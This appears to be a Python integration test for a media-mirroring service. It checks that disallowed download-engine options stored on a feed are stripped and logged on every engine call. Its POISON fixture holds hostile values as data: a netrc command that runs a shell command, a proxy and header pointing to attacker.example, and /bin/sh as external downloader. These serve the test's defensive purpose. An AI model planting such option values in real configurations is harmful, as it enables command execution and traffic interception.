"""A Mirror's stored engine_options are filtered again on every engine call (SEC-1).

The API and MCP refuse keys off the allowlist; a row written before 2.3.0 may still
hold one. The refresh, the archive job, the light Refresh's shallow listing and the
manual metadata fetch must all drop it, log it with the Feed's id, and pass the
allowlisted rest through.
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from typing import Any

import pytest
import structlog

from copycast.app import Container
from copycast.domain.enums import ArchiveState
from copycast.worker.runner import Runner
from tests.integration.worker.conftest import create_mirror, uow
from tests.support.factories import listing
from tests.support.fake_engine import FakeEngine

pytestmark = pytest.mark.integration

CHANNEL_RAW = {"extractor": "youtube:tab", "id": "UCopts", "channel_id": "UCopts"}
ALLOWED = {"ratelimit": 50_000, "extractor_args": {"youtube": {"player_client": ["ios"]}}}
POISON = {
    "netrc_cmd": "touch /tmp/copycast-pwned",
    "usenetrc": True,
    "proxy": "http://attacker.example:3128",
    "http_headers": {"Ytdl-Request-Proxy": "http://attacker.example:3128"},
    "external_downloader": {"default": "/bin/sh"},
}
REFUSED = sorted(POISON)


def _assert_clean(options: dict[str, Any]) -> None:
    for key in POISON:
        assert key not in options, key
    assert options["ratelimit"] == 50_000
    assert options["extractor_args"]["youtube"]["player_client"] == ["ios"]


def _refusals(events: list[dict[str, Any]], feed_id: str) -> list[list[str]]:
    return [
        e["keys"]
        for e in events
        if e["event"] == "engine_options.refused" and e["feed_id"] == feed_id
    ]


async def test_a_poisoned_row_never_reaches_the_engine(
    container: Container, engine: FakeEngine, runner: Runner
) -> None:
    url = "https://www.youtube.com/@opts/videos"
    engine.script_listing(url, listing(2, service="YouTube", raw=CHANNEL_RAW))
    mirror = await create_mirror(container, url, engine_options=ALLOWED)
    assert mirror.engine_options == ALLOWED
    async with uow(container) as unit:
        feed = await unit.feeds.require(mirror.id)
        feed.engine_options = {**ALLOWED, **POISON}  # as a 2.2 row could hold it
        await unit.flush()
    # Creating it probed the Source with the operator's options alone.
    engine.records.options_seen.clear()
    engine.records.listings.clear()

    with structlog.testing.capture_logs() as events:
        await runner.run_until_idle()  # the first Refresh, then both archive jobs
    assert engine.records.listings and len(engine.records.fetches) == 2
    for options in engine.records.options_seen:
        _assert_clean(options)
    refusals = _refusals(events, mirror.id)
    assert refusals and all(keys == REFUSED for keys in refusals)
    async with uow(container) as unit:
        items = await unit.catalog.for_feed(mirror.id)
        assert {i.archive_state for i in items} == {ArchiveState.archived}
        page_url = items[0].source_url
        # The row itself is left as it was: the operator sees what it holds.
        assert (await unit.feeds.require(mirror.id)).engine_options["netrc_cmd"]
    assert page_url

    # The manual metadata fetch goes through the same filter.
    engine.records.options_seen.clear()
    engine.script_listing(page_url, listing(1, service="YouTube"))
    with structlog.testing.capture_logs() as events:
        await container.services.fetch_item_metadata(mirror.id, items[0].id)
    assert len(engine.records.options_seen) == 1
    _assert_clean(engine.records.options_seen[0])
    assert _refusals(events, mirror.id) == [REFUSED]

    # And so does the light Refresh's shallow listing.
    ago = datetime.now(UTC) - timedelta(hours=1)
    async with container.uow_factory() as unit:
        await unit.feeds.set_refresh_attempt(mirror.id, ago)
        await unit.feeds.set_light_refresh_at(mirror.id, ago)
    engine.records.options_seen.clear()
    with structlog.testing.capture_logs() as events:
        await container.services.light_refresh(mirror.id)
    shallow = engine.records.listings[-1]
    assert shallow.url == url and shallow.limit is not None
    _assert_clean(shallow.options)
    assert _refusals(events, mirror.id) == [REFUSED]
